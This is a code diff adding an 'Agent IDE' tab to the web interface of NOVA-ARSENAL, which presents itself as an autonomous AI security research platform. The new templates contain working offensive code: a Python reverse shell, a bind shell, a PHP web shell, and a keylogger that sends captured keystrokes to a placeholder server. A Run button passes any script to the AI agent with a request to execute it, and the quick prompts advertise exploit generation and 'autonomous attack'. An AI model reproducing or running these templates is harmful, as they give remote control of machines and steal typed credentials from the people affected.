@@ -271,6 +271,81 @@
             box-shadow: 0 0 0 2px var(--accent-glow);
         }
 
+        /* ── Tab Bar ─────────────────────────────────────────────────── */
+        .tab-bar {
+            display: flex;
+            gap: 4px;
+            margin-left: 24px;
+        }
+        .tab-bar button {
+            background: transparent;
+            border: none;
+            color: var(--text-dim);
+            padding: 6px 16px;
+            border-radius: 6px 6px 0 0;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        .tab-bar button:hover { color: var(--text); background: var(--surface-2); }
+        .tab-bar button.active { color: var(--accent); background: var(--surface-2); border-bottom: 2px solid var(--accent); }
+
+        /* ── IDE Tab ──────────────────────────────────────────────────── */
+        #ideTab {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+            overflow: hidden;
+        }
+        #ideTab .ide-toolbar {
+            display: flex;
+            gap: 8px;
+            padding: 12px 24px;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            align-items: center;
+        }
+        #ideTab .ide-toolbar select {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-family: inherit;
+        }
+        #ideTab .ide-toolbar button {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        #ideTab .ide-toolbar button:hover { border-color: var(--accent); color: var(--accent); }
+        #ideTab .ide-toolbar button.primary { background: var(--accent); border-color: var(--accent); color: white; }
+        #ideTab .ide-toolbar button.primary:hover { background: #2563eb; }
+        #ideTab .ide-toolbar .spacer { flex: 1; }
+        #ideTab #editorContainer {
+            flex: 1;
+            overflow: hidden;
+        }
+        #ideTab #ideOutput {
+            background: var(--surface);
+            border-top: 1px solid var(--border);
+            padding: 12px 24px;
+            font-size: 12px;
+            color: var(--text-dim);
+            max-height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-family: inherit;
+        }
+
         .input-wrapper textarea::placeholder {
             color: var(--text-dim);
         }
@@ -393,6 +468,10 @@
 <body>
     <header>
         <div class="logo">NOVA-ARSENAL</div>
+        <div class="tab-bar">
+            <button id="tabChat" class="active" onclick="switchTab('chat')">Chat</button>
+            <button id="tabIde" onclick="switchTab('ide')">Agent IDE</button>
+        </div>
         <div class="status">
             <span class="status-dot"></span>
             <span id="statusText">Ready</span>
@@ -403,72 +482,103 @@
         </div>
     </header>
 
-    <div class="chat-container" id="chatContainer">
-        <div class="welcome" id="welcome">
-            <div class="logo-big">NOVA</div>
-            <div class="tagline">Autonomous Security Research Platform</div>
-            <div class="capabilities">
-                <div class="capability" onclick="sendQuick('What can you do?')">
-                    <div class="icon">🤖</div>
-                    <div class="label">Converse</div>
-                    <div class="desc">Ask me anything</div>
+    <div id="chatTab" style="display:flex;flex-direction:column;flex:1;overflow:hidden;">
+        <div class="chat-container" id="chatContainer">
+            <div class="welcome" id="welcome">
+                <div class="logo-big">NOVA</div>
+                <div class="tagline">Autonomous Security Research Platform</div>
+                <div class="capabilities">
+                    <div class="capability" onclick="sendQuick('What can you do?')">
+                        <div class="icon">🤖</div>
+                        <div class="label">Converse</div>
+                        <div class="desc">Ask me anything</div>
+                    </div>
+                    <div class="capability" onclick="sendQuick('Scan my network for open ports')">
+                        <div class="icon">🔍</div>
+                        <div class="label">Recon</div>
+                        <div class="desc">Scan & enumerate</div>
+                    </div>
+                    <div class="capability" onclick="sendQuick('Write a reverse shell payload')">
+                        <div class="icon">💻</div>
+                        <div class="label">Code</div>
+                        <div class="desc">Generate exploits</div>
+                    </div>
+                    <div class="capability" onclick="sendQuick('How does nmap work?')">
+                        <div class="icon">🛠️</div>
+                        <div class="label">Tools</div>
+                        <div class="desc">Learn Kali tools</div>
+                    </div>
+                    <div class="capability" onclick="sendQuick('Run a full penetration test')">
+                        <div class="icon">⚔️</div>
+                        <div class="label">Pentest</div>
+                        <div class="desc">Autonomous attack</div>
+                    </div>
+                    <div class="capability" onclick="sendQuick('Explain SQL injection')">
+                        <div class="icon">📖</div>
+                        <div class="label">Learn</div>
+                        <div class="desc">Security concepts</div>
+                    </div>
                 </div>
-                <div class="capability" onclick="sendQuick('Scan my network for open ports')">
-                    <div class="icon">🔍</div>
-                    <div class="label">Recon</div>
-                    <div class="desc">Scan & enumerate</div>
-                </div>
-                <div class="capability" onclick="sendQuick('Write a reverse shell payload')">
-                    <div class="icon">💻</div>
-                    <div class="label">Code</div>
-                    <div class="desc">Generate exploits</div>
-                </div>
-                <div class="capability" onclick="sendQuick('How does nmap work?')">
-                    <div class="icon">🛠️</div>
-                    <div class="label">Tools</div>
-                    <div class="desc">Learn Kali tools</div>
-                </div>
-                <div class="capability" onclick="sendQuick('Run a full penetration test')">
-                    <div class="icon">⚔️</div>
-                    <div class="label">Pentest</div>
-                    <div class="desc">Autonomous attack</div>
-                </div>
-                <div class="capability" onclick="sendQuick('Explain SQL injection')">
-                    <div class="icon">📖</div>
-                    <div class="label">Learn</div>
-                    <div class="desc">Security concepts</div>
-                </div>
+            </div>
+
+            <div class="typing-indicator" id="typingIndicator">
+                Nova is thinking <span class="dots"><span></span><span></span><span></span></span>
             </div>
         </div>
 
-        <div class="typing-indicator" id="typingIndicator">
-            Nova is thinking <span class="dots"><span></span><span></span><span></span></span>
+        <div class="input-area">
+            <div class="input-wrapper">
+                <textarea
+                    id="messageInput"
+                    placeholder="Talk to Nova..."
+                    rows="1"
+                    onkeydown="handleKey(event)"
+                    oninput="autoResize(this)"
+                ></textarea>
+                <button class="send-btn" id="sendBtn" onclick="sendMessage()">
+                    <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                </button>
+            </div>
+            <div class="input-hints">
+                <span class="hint-chip" onclick="sendQuick('What is nmap?')">nmap</span>
+                <span class="hint-chip" onclick="sendQuick('How do I use sqlmap?')">sqlmap</span>
+                <span class="hint-chip" onclick="sendQuick('Scan for vulnerabilities')">vuln scan</span>
+                <span class="hint-chip" onclick="sendQuick('Write a Python exploit')">write exploit</span>
+                <span class="hint-chip" onclick="sendQuick('Explain reverse shells')">reverse shells</span>
+                <span class="hint-chip" onclick="sendQuick('What tools do I need for web app testing?')">web testing</span>
+            </div>
         </div>
     </div>
 
-    <div class="input-area">
-        <div class="input-wrapper">
-            <textarea
-                id="messageInput"
-                placeholder="Talk to Nova..."
-                rows="1"
-                onkeydown="handleKey(event)"
-                oninput="autoResize(this)"
-            ></textarea>
-            <button class="send-btn" id="sendBtn" onclick="sendMessage()">
-                <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
-            </button>
+    <div id="ideTab">
+        <div class="ide-toolbar">
+            <select id="templateSelect" onchange="loadTemplate()">
+                <option value="">Select template...</option>
+                <option value="reverse_shell">Reverse Shell (Python)</option>
+                <option value="bind_shell">Bind Shell (Python)</option>
+                <option value="port_scanner">Port Scanner (Python)</option>
+                <option value="subdomain_enum">Subdomain Enumerator (Python)</option>
+                <option value="webshell_php">Web Shell (PHP)</option>
+                <option value="keylogger">Keylogger (Python)</option>
+            </select>
+            <select id="langSelect">
+                <option value="python">Python</option>
+                <option value="bash">Bash</option>
+                <option value="php">PHP</option>
+                <option value="powershell">PowerShell</option>
+                <option value="ruby">Ruby</option>
+                <option value="perl">Perl</option>
+            </select>
+            <span class="spacer"></span>
+            <button onclick="runIdeCode()" class="primary">Run</button>
+            <button onclick="copyIdeCode()">Copy</button>
+            <button onclick="clearIdeOutput()">Clear Output</button>
         </div>
-        <div class="input-hints">
-            <span class="hint-chip" onclick="sendQuick('What is nmap?')">nmap</span>
-            <span class="hint-chip" onclick="sendQuick('How do I use sqlmap?')">sqlmap</span>
-            <span class="hint-chip" onclick="sendQuick('Scan for vulnerabilities')">vuln scan</span>
-            <span class="hint-chip" onclick="sendQuick('Write a Python exploit')">write exploit</span>
-            <span class="hint-chip" onclick="sendQuick('Explain reverse shells')">reverse shells</span>
-            <span class="hint-chip" onclick="sendQuick('What tools do I need for web app testing?')">web testing</span>
-        </div>
+        <div id="editorContainer"></div>
+        <div id="ideOutput">Output will appear here...</div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs/loader.js"></script>
     <script>
         let sessionId = localStorage.getItem('nova_session') || crypto.randomUUID();
         localStorage.setItem('nova_session', sessionId);
@@ -661,6 +771,99 @@
             } catch {
                 alert('No history yet');
             }
+        }
+
+        // Focus input on load
+        messageInput.focus();
+
+        // ── Tab Switching ─────────────────────────────────────────────
+        let ideEditor = null;
+
+        function switchTab(tab) {
+            document.getElementById('tabChat').className = tab === 'chat' ? 'active' : '';
+            document.getElementById('tabIde').className = tab === 'ide' ? 'active' : '';
+            document.getElementById('chatTab').style.display = tab === 'chat' ? 'flex' : 'none';
+            document.getElementById('ideTab').style.display = tab === 'ide' ? 'flex' : 'none';
+
+            if (tab === 'ide' && !ideEditor) {
+                initIdeEditor();
+            }
+            if (tab === 'ide' && ideEditor) {
+                setTimeout(() => ideEditor.layout(), 100);
+            }
+        }
+
+        function initIdeEditor() {
+            require.config({ paths: { vs: 'https://cdn.jsdelivr.net/npm/monaco-editor@0.45.0/min/vs' } });
+            require(['vs/editor/editor.main'], function () {
+                ideEditor = monaco.editor.create(document.getElementById('editorContainer'), {
+                    value: '# Write your security script here\nimport socket\nimport sys\n\ndef scan_port(host, port):\n    s = socket.socket()\n    s.settimeout(2)\n    try:\n        s.connect((host, port))\n        return True\n    except:\n        return False\n    finally:\n        s.close()\n\nif __name__ == "__main__":\n    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"\n    for port in [22, 80, 443, 3306, 8080]:\n        if scan_port(host, port):\n            print(f"Port {port} is OPEN")\n',
+                    language: 'python',
+                    theme: 'vs-dark',
+                    minimap: { enabled: false },
+                    fontSize: 13,
+                    lineNumbers: 'on',
+                    scrollBeyondLastLine: false,
+                    automaticLayout: true,
+                    padding: { top: 12 },
+                });
+            });
+        }
+
+        function loadTemplate() {
+            const sel = document.getElementById('templateSelect');
+            const template = sel.value;
+            if (!template || !ideEditor) return;
+
+            const templates = {
+                reverse_shell: `#!/usr/bin/env python3\nimport socket\nimport subprocess\nimport os\n\nLHOST = "YOUR_IP"\nLPORT = 4444\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((LHOST, LPORT))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(["/bin/sh", "-i"])`,
+                bind_shell: `#!/usr/bin/env python3\nimport socket\nimport subprocess\n\nRPORT = 4444\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind(("0.0.0.0", RPORT))\ns.listen(1)\nconn, addr = s.accept()\n\nwhile True:\n    data = conn.recv(1024)\n    if not data: break\n    conn.send(subprocess.check_output(data, shell=True))`,
+                port_scanner: `#!/usr/bin/env python3\nimport socket\nfrom concurrent.futures import ThreadPoolExecutor\n\nHOST = "127.0.0.1"\nPORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 8080, 8443, 27017]\n\ndef scan(port):\n    s = socket.socket()\n    s.settimeout(1.5)\n    try:\n        s.connect((HOST, port))\n        return port, True, socket.getservbyport(port, "tcp")\n    except:\n        return port, False, ""\n    finally:\n        s.close()\n\nwith ThreadPoolExecutor(max_workers=20) as pool:\n    for port, open_, service in pool.map(scan, PORTS):\n        if open_:\n            print(f"{port:5d}/tcp  open  {service}")`,
+                subdomain_enum: `#!/usr/bin/env python3\nimport socket\nimport sys\n\nDOMAIN = sys.argv[1] if len(sys.argv) > 1 else "example.com"\n\nsubs = ["www", "mail", "admin", "blog", "api", "dev", "staging", "vpn", "remote", "webmail", "portal", "cms", "app", "test", "cdn"]\n\nfor sub in subs:\n    try:\n        hostname = f"{sub}.{DOMAIN}"\n        ip = socket.gethostbyname(hostname)\n        print(f"{hostname:30s} -> {ip}")\n    except socket.gaierror:\n        pass`,
+                webshell_php: `<?php\n// PHP Web Shell\n// Usage: http://target/shell.php?cmd=command\n\n$cmd = $_GET["cmd"] ?? $_POST["cmd"] ?? "";\nif ($cmd) {\n    echo "<pre>" . shell_exec($cmd) . "</pre>";\n} else {\n    echo "<form><input name='cmd'><input type='submit'></form>";\n}?>\n\n<!-- Simple variant -->\n<?=\`\$\_GET["cmd"]\`?>`,
+                keylogger: `#!/usr/bin/env python3\nimport keyboard\nimport requests\n\nLOG_FILE = "/tmp/keystrokes.log"\nSERVER_URL = "http://YOUR_SERVER/collect"\n\ndef on_key(event):\n    with open(LOG_FILE, "a") as f:\n        f.write(f"{event.name}\\n")\n    if len(open(LOG_FILE).read().split("\\n")) % 50 == 0:\n        with open(LOG_FILE, "r") as f:\n            requests.post(SERVER_URL, data={"logs": f.read()})\n\nkeyboard.on_press(on_key)\nkeyboard.wait()`,
+            };
+
+            if (templates[template]) {
+                ideEditor.setValue(templates[template]);
+                const langMap = { reverse_shell: 'python', bind_shell: 'python', port_scanner: 'python', subdomain_enum: 'python', webshell_php: 'php', keylogger: 'python' };
+                monaco.editor.setModelLanguage(ideEditor.getModel(), langMap[template] || 'python');
+                document.getElementById('langSelect').value = langMap[template] || 'python';
+            }
+        }
+
+        async function runIdeCode() {
+            if (!ideEditor) return;
+            const code = ideEditor.getValue();
+            const language = document.getElementById('langSelect').value;
+            const output = document.getElementById('ideOutput');
+            output.textContent = `Running ${language} code...\n`;
+
+            try {
+                const res = await fetch('/api/chat/stream', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        message: `Execute this ${language} code:\n\n\`\`\`${language}\n${code}\n\`\`\``,
+                        session_id: sessionId,
+                        stream: false,
+                    }),
+                });
+                const data = await res.json();
+                output.textContent += `\n${data.reply}`;
+            } catch (err) {
+                output.textContent += `\nError: ${err.message}`;
+            }
+        }
+
+        function copyIdeCode() {
+            if (!ideEditor) return;
+            navigator.clipboard.writeText(ideEditor.getValue());
+            document.getElementById('ideOutput').textContent = 'Code copied to clipboard!';
+        }
+
+        function clearIdeOutput() {
+            document.getElementById('ideOutput').textContent = 'Output will appear here...';
         }
 
         // Focus input on load
